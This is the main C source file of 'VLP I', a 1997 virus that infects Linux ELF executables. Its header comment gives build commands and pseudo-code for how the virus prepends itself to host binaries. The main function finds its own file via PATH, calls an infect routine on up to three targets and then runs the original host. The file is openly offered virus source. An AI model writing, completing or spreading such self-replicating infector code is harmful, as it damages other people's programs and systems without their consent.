/* This is VLP I . Another method to infect ELF-execs. 
 * Copyright (C) 1997 by Stealthf0rk of S V A T
 * This Virii contains *no* malicious code, but due to
 * bugs it is possible that you may get some damage on your system.
 * You use this progrma(s) on your own risk ! ! !
 * I'm not responsible for any damage you may get due to playing around
 * with this. Only run VLP with permission of the owner of the system you
 * wish to test VLP on.
 *
 * virii: $ cc -O2 -DDEBUG main.c get.c file_ops.c -o virii
 *	  $ strip virii
 * nacs:  $ cc -O2 nacs.c get.c file_ops.c 
 *
 * greets to NetW0rker and naleZ 
 *
 * how it works
 * in bash pseudo_code: 
 * 
 * find hostfile
 * cp hostfile tmp 	
 * grep THE_VIRCODE argv[0] > hostfile
 * cat tmp >> hostfile
 * grep THE_OLD_APPENDED_CODE_ON_ARGV[0] argv[0] > tmp
 * tmp
 *		 	
 *
 * if you wanna contact the SVAT-group, write to 
 * stealthf0rk,	stealth@cyberspace.org 
 */

#include "vx.h"
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/* The filedescriptor for the LOG-file */

#ifdef DEBUG
FILE *fd;
#endif

int main(int argc, char **argv, char **envp)
{
   	char *s, *s2, *path, *dir;
        int i;
        char from[200];        
        
#ifdef DEBUG
       /* If U are angry do this:
        * setenv("PATH", "/root/VTEST/bin:/root/VTEST/bad:/root/VTEST/usr/bin:/root/VTEST/bad2", 1);
        */
        fd = fopen(TRACEFILE, "a");
#endif
        DFPRINTF("====== tracefile of stealthf0rk's VLP ==========\n");
        path = getenv("PATH");
        s = whereis(path, argv[0]);  /* return only static! -> */
        if (strcpy(from, s) == NULL) /* so we need a copy */
           	return -1;
        DFPRINTF("@f main: file of action is <%s>\n", from);
        i = infect(3, from);
        exechost(from, argv, envp);
        return 0;
}
